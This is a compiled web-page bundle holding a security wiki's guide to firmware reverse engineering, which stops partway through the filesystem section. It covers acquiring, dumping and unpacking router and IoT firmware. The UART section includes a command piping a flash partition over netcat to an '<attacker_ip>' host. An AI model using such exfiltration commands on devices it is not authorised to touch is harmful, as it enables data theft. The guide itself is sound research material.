"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[7806],{28453:(e,n,i)=>{i.d(n,{R:()=>a,x:()=>l});var r=i(96540);const s={},t=r.createContext(s);function a(e){const n=r.useContext(t);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),r.createElement(t.Provider,{value:n},e.children)}},79328:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>o,contentTitle:()=>l,default:()=>h,frontMatter:()=>a,metadata:()=>r,toc:()=>c});const r=JSON.parse('{"id":"Security/Pentesting/sop-firmware-reverse-engineering","title":"Firmware Reverse Engineering","description":"Extract & analyze firmware: binary extraction, filesystem analysis, vulnerability hunting in IoT devices. Tools: Binwalk, Ghidra, QEMU emulation.","source":"@site/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering.md","sourceDirName":"Security/Pentesting","slug":"/Security/Pentesting/sop-firmware-reverse-engineering","permalink":"/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Pentesting/sop-firmware-reverse-engineering.md","tags":[{"inline":true,"label":"sop","permalink":"/intel-codex/tags/sop"},{"inline":true,"label":"firmware","permalink":"/intel-codex/tags/firmware"},{"inline":true,"label":"iot","permalink":"/intel-codex/tags/iot"},{"inline":true,"label":"embedded","permalink":"/intel-codex/tags/embedded"},{"inline":true,"label":"reverse-engineering","permalink":"/intel-codex/tags/reverse-engineering"},{"inline":true,"label":"hardware","permalink":"/intel-codex/tags/hardware"},{"inline":true,"label":"router","permalink":"/intel-codex/tags/router"}],"version":"current","lastUpdatedAt":null,"frontMatter":{"type":"sop","title":"Firmware Reverse Engineering","description":"Extract & analyze firmware: binary extraction, filesystem analysis, vulnerability hunting in IoT devices. Tools: Binwalk, Ghidra, QEMU emulation.","created":"2025-10-05T00:00:00.000Z","tags":["sop","firmware","iot","embedded","reverse-engineering","hardware","router"]},"sidebar":"intelCodexSidebar","previous":{"title":"Detection & Evasion Testing SOP (Purple Team)","permalink":"/intel-codex/Security/Pentesting/sop-detection-evasion-testing"},"next":{"title":"Linux Pentesting SOP (Authorized)","permalink":"/intel-codex/Security/Pentesting/sop-linux-pentest"}}');var s=i(74848),t=i(28453);const a={type:"sop",title:"Firmware Reverse Engineering",description:"Extract & analyze firmware: binary extraction, filesystem analysis, vulnerability hunting in IoT devices. Tools: Binwalk, Ghidra, QEMU emulation.",created:new Date("2025-10-05T00:00:00.000Z"),tags:["sop","firmware","iot","embedded","reverse-engineering","hardware","router"]},l="Firmware Reverse Engineering",o={},c=[{value:"Table of Contents",id:"table-of-contents",level:2},{value:"Overview",id:"overview",level:2},{value:"What is Firmware?",id:"what-is-firmware",level:3},{value:"Why Reverse Firmware?",id:"why-reverse-firmware",level:3},{value:"Threat Model",id:"threat-model",level:3},{value:"Legal &amp; Ethical Considerations",id:"legal--ethical-considerations",level:3},{value:"Firmware Acquisition",id:"firmware-acquisition",level:2},{value:"Method 1: Download from Vendor Website",id:"method-1-download-from-vendor-website",level:3},{value:"Method 2: Intercept Firmware Update",id:"method-2-intercept-firmware-update",level:3},{value:"Method 3: Extract from Flash Memory (Hardware)",id:"method-3-extract-from-flash-memory-hardware",level:3},{value:"Method 4: UART/Serial Console Extraction",id:"method-4-uartserial-console-extraction",level:3},{value:"Firmware Analysis",id:"firmware-analysis",level:2},{value:"Initial Triage",id:"initial-triage",level:3},{value:"Firmware Unpacking",id:"firmware-unpacking",level:3},{value:"Filesystem Extraction",id:"filesystem-extraction",level:2},{value:"Analyzing Extracted Filesystem",id:"analyzing-extracted-filesystem",level:3},{value:"Searching for Sensitive Information",id:"searching-for-sensitive-information",level:3},{value:"Web Application Files",id:"web-application-files",level:3},{value:"Binary Analysis",id:"binary-analysis",level:2},{value:"Analyzing Embedded Binaries",id:"analyzing-embedded-binaries",level:3},{value:"Cross-Compilation for Testing",id:"cross-compilation-for-testing",level:3},{value:"Hardware Interfaces",id:"hardware-interfaces",level:2},{value:"UART (Universal Asynchronous Receiver/Transmitter)",id:"uart-universal-asynchronous-receivertransmitter",level:3},{value:"JTAG (Joint Test Action Group)",id:"jtag-joint-test-action-group",level:3},{value:"SPI (Serial Peripheral Interface)",id:"spi-serial-peripheral-interface",level:3},{value:"Emulation &amp; Dynamic Analysis",id:"emulation--dynamic-analysis",level:2},{value:"QEMU User-Mode Emulation",id:"qemu-user-mode-emulation",level:3},{value:"QEMU System Emulation",id:"qemu-system-emulation",level:3},{value:"Firmadyne (Automated Firmware Emulation)",id:"firmadyne-automated-firmware-emulation",level:3},{value:"FAT (Firmware Analysis Toolkit)",id:"fat-firmware-analysis-toolkit",level:3},{value:"Common Vulnerabilities",id:"common-vulnerabilities",level:2},{value:"Authentication Bypass",id:"authentication-bypass",level:3},{value:"Command Injection",id:"command-injection",level:3},{value:"Buffer Overflows",id:"buffer-overflows",level:3},{value:"Insecure Firmware Updates",id:"insecure-firmware-updates",level:3},{value:"Weak Cryptography",id:"weak-cryptography",level:3},{value:"Exploitation Techniques",id:"exploitation-techniques",level:2},{value:"Gaining Shell Access",id:"gaining-shell-access",level:3},{value:"Persistence Mechanisms",id:"persistence-mechanisms",level:3},{value:"Post-Exploitation",id:"post-exploitation",level:3},{value:"Tools Reference",id:"tools-reference",level:2},{value:"Firmware Analysis Tools",id:"firmware-analysis-tools",level:3},{value:"Hardware Tools",id:"hardware-tools",level:3},{value:"Emulation &amp; Debugging",id:"emulation--debugging",level:3},{value:"Binary Analysis",id:"binary-analysis-1",level:3},{value:"Exploitation",id:"exploitation",level:3},{value:"Utilities",id:"utilities",level:3},{value:"Practical Workflows",id:"practical-workflows",level:2},{value:"Workflow 1: Router Firmware Analysis",id:"workflow-1-router-firmware-analysis",level:3},{value:"Workflow 2: IoT Camera Firmware Extraction",id:"workflow-2-iot-camera-firmware-extraction",level:3},{value:"Workflow 3: Smart Thermostat Privilege Escalation",id:"workflow-3-smart-thermostat-privilege-escalation",level:3},{value:"Learning Resources",id:"learning-resources",level:2},{value:"Documentation",id:"documentation",level:3},{value:"Books",id:"books",level:3},{value:"Online Courses",id:"online-courses",level:3},{value:"Practice Labs",id:"practice-labs",level:3},{value:"Related SOPs",id:"related-sops",level:2}];function d(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsxs)(n.admonition,{type:"danger",children:[(0,s.jsxs)(n.mdxAdmonitionTitle,{children:["Synced from an ",(0,s.jsx)(n.strong,{children:"Obsidian vault"})]}),(0,s.jsxs)(n.p,{children:["For graph and advanced features, download the ",(0,s.jsx)(n.strong,{children:"full"})," ",(0,s.jsx)(n.strong,{children:(0,s.jsx)(n.a,{href:"https://github.com/gl0bal01/intel-codex",children:"Intel Codex Vault"})})," and open it in ",(0,s.jsx)(n.strong,{children:"Obsidian"}),"."]})]}),"\n",(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"firmware-reverse-engineering",children:"Firmware Reverse Engineering"})}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Purpose:"})," Comprehensive guide to extracting, analyzing, and exploiting firmware from embedded devices (routers, IoT devices, cameras, smart home devices) for security research and vulnerability discovery."]}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"table-of-contents",children:"Table of Contents"}),"\n",(0,s.jsxs)(n.ol,{children:["\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#overview",children:"Overview"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#firmware-acquisition",children:"Firmware Acquisition"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#firmware-analysis",children:"Firmware Analysis"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#filesystem-extraction",children:"Filesystem Extraction"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#binary-analysis",children:"Binary Analysis"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#hardware-interfaces",children:"Hardware Interfaces"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#emulation--dynamic-analysis",children:"Emulation & Dynamic Analysis"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#common-vulnerabilities",children:"Common Vulnerabilities"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#exploitation-techniques",children:"Exploitation Techniques"})}),"\n",(0,s.jsx)(n.li,{children:(0,s.jsx)(n.a,{href:"#tools-reference",children:"Tools Reference"})}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,s.jsx)(n.h3,{id:"what-is-firmware",children:"What is Firmware?"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Firmware"})," is software embedded in hardware devices that controls device functionality. Unlike desktop software, firmware:"]}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Runs on resource-constrained embedded processors (ARM, MIPS, PowerPC)"}),"\n",(0,s.jsx)(n.li,{children:"Often uses custom Linux distributions (embedded Linux, BusyBox)"}),"\n",(0,s.jsx)(n.li,{children:"May use Real-Time Operating Systems (RTOS) or bare-metal code"}),"\n",(0,s.jsx)(n.li,{children:"Stored in non-volatile memory (flash, EEPROM, ROM)"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Common embedded devices:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Network devices:"})," Routers, switches, access points, firewalls"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"IoT devices:"})," Smart cameras, door locks, thermostats, light bulbs"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Industrial control:"})," PLCs (Programmable Logic Controllers), SCADA systems"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Consumer electronics:"})," Smart TVs, set-top boxes, printers"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Automotive:"})," Car infotainment systems, ECUs (Engine Control Units)"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"why-reverse-firmware",children:"Why Reverse Firmware?"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Security research:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Discover vulnerabilities (command injection, authentication bypass, hardcoded credentials)"}),"\n",(0,s.jsx)(n.li,{children:"Analyze encryption implementations"}),"\n",(0,s.jsx)(n.li,{children:"Understand attack surface before pentesting"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Compatibility & interoperability:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Reverse proprietary protocols"}),"\n",(0,s.jsx)(n.li,{children:"Enable third-party firmware (OpenWrt, DD-WRT)"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Forensics:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Recover deleted data from devices"}),"\n",(0,s.jsx)(n.li,{children:"Analyze malware on IoT devices"}),"\n",(0,s.jsx)(n.li,{children:"Incident response for compromised embedded systems"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"threat-model",children:"Threat Model"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Attacker capabilities:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Remote attacker:"})," Network access only (web interface, network services)"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Local network attacker:"})," LAN access (MITM, spoofing)"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Physical access:"})," UART/JTAG debugging, firmware extraction, hardware modification"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Insider threat:"})," Supply chain attacks, malicious firmware updates"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Common attack vectors:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Unauthenticated web interfaces"}),"\n",(0,s.jsx)(n.li,{children:"Default/hardcoded credentials"}),"\n",(0,s.jsx)(n.li,{children:"Command injection in web parameters"}),"\n",(0,s.jsx)(n.li,{children:"Buffer overflows in network services"}),"\n",(0,s.jsx)(n.li,{children:"Insecure firmware update mechanisms"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"legal--ethical-considerations",children:"Legal & Ethical Considerations"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Legal risks:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"DMCA Section 1201 (US):"})," Prohibits circumventing access controls (encryption, code signing)"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"CFAA:"})," Unauthorized access to computer systems"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Warranty void:"})," Hardware modification may void warranties"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Responsible disclosure:"})," Report vulnerabilities to vendors before public disclosure"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Ethical guidelines:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"\u2705 Security research on devices you own"}),"\n",(0,s.jsx)(n.li,{children:"\u2705 Responsible vulnerability disclosure (CVE, vendor coordination)"}),"\n",(0,s.jsx)(n.li,{children:"\u2705 Improving device security (custom firmware, patches)"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Attacking devices you don't own without authorization"}),"\n",(0,s.jsx)(n.li,{children:"\u274c Weaponizing vulnerabilities for malicious purposes"}),"\n"]}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"firmware-acquisition",children:"Firmware Acquisition"}),"\n",(0,s.jsx)(n.h3,{id:"method-1-download-from-vendor-website",children:"Method 1: Download from Vendor Website"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"Easiest method"})," - many vendors provide firmware updates for download."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Finding firmware:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Google search:\nsite:vendor.com "firmware update" "download"\n\n# Example (TP-Link router):\n# https://www.tp-link.com/us/support/download/\n\n# Download firmware:\nwget https://static.tp-link.com/...firmware.bin\n\n# Verify hash (if vendor provides):\nsha256sum firmware.bin\n# Compare with vendor-provided SHA-256 hash\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Firmware update file types:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:".bin"})," - Raw binary image"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:".img"})," - Disk image"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:".zip"})," / ",(0,s.jsx)(n.code,{children:".tar.gz"})," - Compressed archive"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:".trx"})," - TRX firmware format (Broadcom routers)"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:".chk"})," - Netgear firmware format"]}),"\n",(0,s.jsx)(n.li,{children:"Vendor-specific formats (encrypted or obfuscated)"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"method-2-intercept-firmware-update",children:"Method 2: Intercept Firmware Update"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"If vendor doesn't provide direct download"}),", intercept update traffic."]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Setup:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Wireshark capture during firmware update:\n# 1. Start Wireshark on network interface\n# 2. Filter: http or dns\n# 3. Trigger firmware update from device web interface\n# 4. Look for HTTP GET/POST to download URL\n\n# Example captured URL:\n# http://update.vendor.com/firmware/device_v1.2.3.bin\n\n# Download:\nwget http://update.vendor.com/firmware/device_v1.2.3.bin\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"HTTPS interception (if update is encrypted):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Use Burp Suite or mitmproxy as HTTPS proxy:\n# 1. Configure device to use proxy (if possible)\n# 2. Install proxy CA certificate on device (if possible)\n# 3. Capture firmware download URL\n\n# If device validates certificate (common), this won't work\n# Fall back to hardware extraction\n"})}),"\n",(0,s.jsx)(n.h3,{id:"method-3-extract-from-flash-memory-hardware",children:"Method 3: Extract from Flash Memory (Hardware)"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Required when:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Vendor doesn't provide firmware"}),"\n",(0,s.jsx)(n.li,{children:"Firmware is encrypted during updates"}),"\n",(0,s.jsx)(n.li,{children:"Need to analyze modified/infected firmware"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Hardware required:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Flash programmer:"})," Bus Pirate, CH341A USB programmer, Raspberry Pi"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Chip clip or soldering iron:"})," To connect to flash chip"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Multimeter:"})," To identify voltage levels"]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Common flash memory types:"})}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Type"}),(0,s.jsx)(n.th,{children:"Interface"}),(0,s.jsx)(n.th,{children:"Capacity"}),(0,s.jsx)(n.th,{children:"Common Use"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"SPI Flash (25-series)"})}),(0,s.jsx)(n.td,{children:"SPI (4-8 pins)"}),(0,s.jsx)(n.td,{children:"1-128 MB"}),(0,s.jsx)(n.td,{children:"Routers, IoT"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"NAND Flash"})}),(0,s.jsx)(n.td,{children:"Parallel"}),(0,s.jsx)(n.td,{children:"128 MB - 32 GB"}),(0,s.jsx)(n.td,{children:"Smartphones, tablets"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"eMMC"})}),(0,s.jsx)(n.td,{children:"MMC interface"}),(0,s.jsx)(n.td,{children:"4-256 GB"}),(0,s.jsx)(n.td,{children:"Android devices, embedded Linux"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:(0,s.jsx)(n.strong,{children:"I2C EEPROM (24-series)"})}),(0,s.jsx)(n.td,{children:"I2C (2 pins)"}),(0,s.jsx)(n.td,{children:"1-512 KB"}),(0,s.jsx)(n.td,{children:"Small devices, config storage"})]})]})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Extracting SPI flash (most common):"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 1: Identify flash chip"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Open device, locate flash chip on PCB\n# Common SPI flash chips: Winbond W25Q64, Macronix MX25L, Spansion S25FL\n\n# Example chip markings:\n# Winbold\n# 25Q64FVSIG\n# 1234567890  (date code)\n\n# Datasheet: Google "W25Q64 datasheet"\n# Pinout (SOIC-8):\n# Pin 1: /CS (Chip Select)\n# Pin 2: DO (Data Out / MISO)\n# Pin 3: /WP (Write Protect)\n# Pin 4: GND\n# Pin 5: DI (Data In / MOSI)\n# Pin 6: CLK (Clock)\n# Pin 7: /HOLD\n# Pin 8: VCC (3.3V)\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 2: Connect flash programmer"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Using CH341A USB programmer:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# CH341A wiring to SPI flash (SOIC-8):\n# CH341A    | SPI Flash Pin | Function\n# --------- | ------------- | --------\n# VCC (3.3V)| Pin 8         | Power\n# GND       | Pin 4         | Ground\n# CS        | Pin 1         | Chip Select\n# MISO      | Pin 2         | Data Out\n# MOSI      | Pin 5         | Data In\n# CLK       | Pin 6         | Clock\n\n# Option 1: Use chip clip (no soldering)\n# Attach SOIC-8 clip to chip while on PCB\n\n# Option 2: Desolder chip (more reliable)\n# Use hot air station or soldering iron\n# Place chip in ZIF socket on CH341A programmer\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Step 3: Read flash memory"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Linux: Install flashrom\nsudo apt install flashrom\n\n# Detect flash chip:\nsudo flashrom -p ch341a_spi\n\n# Output:\n# Found Winbond flash chip "W25Q64.V" (8192 kB, SPI) on ch341a_spi.\n\n# Read flash (3 times to verify integrity):\nsudo flashrom -p ch341a_spi -r firmware1.bin\nsudo flashrom -p ch341a_spi -r firmware2.bin\nsudo flashrom -p ch341a_spi -r firmware3.bin\n\n# Verify all reads are identical (compare hashes):\nsha256sum firmware*.bin\n# All three should have same hash\n\n# Use firmware1.bin for analysis\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Using Raspberry Pi as SPI programmer:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Enable SPI on Raspberry Pi:\nsudo raspi-config\n# Interfacing Options \u2192 SPI \u2192 Enable\n\n# Wiring (Raspberry Pi GPIO to SPI flash):\n# RPi GPIO  | SPI Flash Pin | Function\n# --------- | ------------- | --------\n# Pin 1 (3.3V) | Pin 8      | Power\n# Pin 6 (GND)  | Pin 4      | Ground\n# Pin 24 (CE0) | Pin 1      | Chip Select\n# Pin 21 (MISO)| Pin 2      | Data Out\n# Pin 19 (MOSI)| Pin 5      | Data In\n# Pin 23 (SCLK)| Pin 6      | Clock\n\n# Read flash:\nsudo flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 -r firmware.bin\n"})}),"\n",(0,s.jsx)(n.h3,{id:"method-4-uartserial-console-extraction",children:"Method 4: UART/Serial Console Extraction"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.strong,{children:"If device has UART debug console"}),", you may be able to dump firmware."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Connect to UART (see Hardware Interfaces section)\n# Common UART commands (BusyBox/Linux):\n\n# Dump entire flash partition:\ndd if=/dev/mtd0 | nc &lt;attacker_ip&gt; 1234\n\n# On attacker machine:\nnc -l -p 1234 > firmware.bin\n\n# Or use base64 encoding (if binary transfer fails):\ndd if=/dev/mtd0 | base64\n# Copy output, decode on attacker machine:\nbase64 -d > firmware.bin\n"})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"firmware-analysis",children:"Firmware Analysis"}),"\n",(0,s.jsx)(n.h3,{id:"initial-triage",children:"Initial Triage"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Determine firmware type and architecture:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# File type detection:\nfile firmware.bin\n# Output examples:\n# - "data" (raw binary, compressed, or encrypted)\n# - "ELF 32-bit LSB executable, ARM" (Linux kernel or application)\n# - "gzip compressed data" (compressed filesystem)\n# - "Squashfs filesystem" (embedded filesystem)\n\n# Binwalk: Identify embedded files/filesystems\nbinwalk firmware.bin\n\n# Output:\n# DECIMAL       HEXADECIMAL     DESCRIPTION\n# --------------------------------------------------------------------------------\n# 0             0x0             TRX firmware header\n# 28            0x1C            LZMA compressed data\n# 1048576       0x100000        Squashfs filesystem, little endian, version 4.0\n# 5242880       0x500000        JFFS2 filesystem, little endian\n\n# Entropy analysis (detect encryption):\nbinwalk -E firmware.bin\n# High entropy (close to 1.0) = encrypted or compressed\n# Low entropy = uncompressed data\n\n# Strings analysis (look for clues):\nstrings firmware.bin | grep -i "version\\|copyright\\|password\\|root"\n'})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Identify architecture:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Look for ELF binaries in firmware (after extraction):\nfile bin/busybox\n# Output: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1\n\n# Common embedded architectures:\n# - ARM (32-bit: ARMv7, 64-bit: ARMv8/AArch64)\n# - MIPS (32-bit: MIPS32, 64-bit: MIPS64)\n# - PowerPC (PPC)\n# - x86/x64 (less common in embedded)\n"})}),"\n",(0,s.jsx)(n.h3,{id:"firmware-unpacking",children:"Firmware Unpacking"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Automated unpacking with binwalk:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Extract all embedded files/filesystems:\nbinwalk -e firmware.bin\n\n# Output directory: _firmware.bin.extracted/\n# Contains extracted filesystems, compressed data, etc.\n\n# Navigate to extracted filesystem:\ncd _firmware.bin.extracted/squashfs-root/\nls -la\n# Output: bin/ etc/ lib/ sbin/ usr/ var/ www/\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Manual unpacking (if binwalk fails):"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Example: SquashFS at offset 0x100000\n# Extract with dd and unsquashfs:\n\ndd if=firmware.bin bs=1 skip=$((0x100000)) of=filesystem.squashfs\nunsquashfs filesystem.squashfs\n\n# Output: squashfs-root/\n\n# Example: JFFS2 filesystem\ndd if=firmware.bin bs=1 skip=$((0x500000)) of=filesystem.jffs2\n\n# Mount JFFS2 (requires mtd-utils):\nsudo modprobe mtdblock\nsudo modprobe mtdram total_size=32768 erase_size=256\nsudo dd if=filesystem.jffs2 of=/dev/mtdblock0\nsudo mount -t jffs2 /dev/mtdblock0 /mnt/jffs2\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Handling encrypted firmware:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Encryption detection:\nbinwalk -E firmware.bin\n# High entropy across entire file = likely encrypted\n\n# Decryption strategies:\n# 1. Find decryption key in device memory (UART shell, if available)\n# 2. Reverse firmware update process (find decryption routine in bootloader/updater)\n# 3. Extract key from device flash (may be stored separately)\n# 4. Hardware attacks (fault injection, side-channel analysis)\n\n# Example: Find AES key in memory dump\nstrings memory_dump.bin | grep -E "^[0-9a-fA-F]{32}$"  # 128-bit AES key (hex)\n'})}),"\n",(0,s.jsx)(n.hr,{}),"\n",(0,s.jsx)(n.h2,{id:"filesystem-extraction",children:"Filesystem Extraction"}),"\n",(0,s.jsx)(n.h3,{id:"analyzing-extracted-filesystem",children:"Analyzing Extracted Filesystem"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Key directories in embedded Linux:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Navigate to extracted filesystem:\ncd squashfs-root/\n\n# Directory structure:\nbin/        # Essential binaries (busybox, sh)\nsbin/       # System binaries (init, ifconfig)\netc/        # Configuration files (passwd, shadow, init scripts)\nlib/        # Shared libraries (libc, libpthread)\nusr/        # User programs and libraries\nvar/        # Variable data (logs, tmp files)\nwww/        # Web server files (HTML, CGI scripts)\ndev/        # 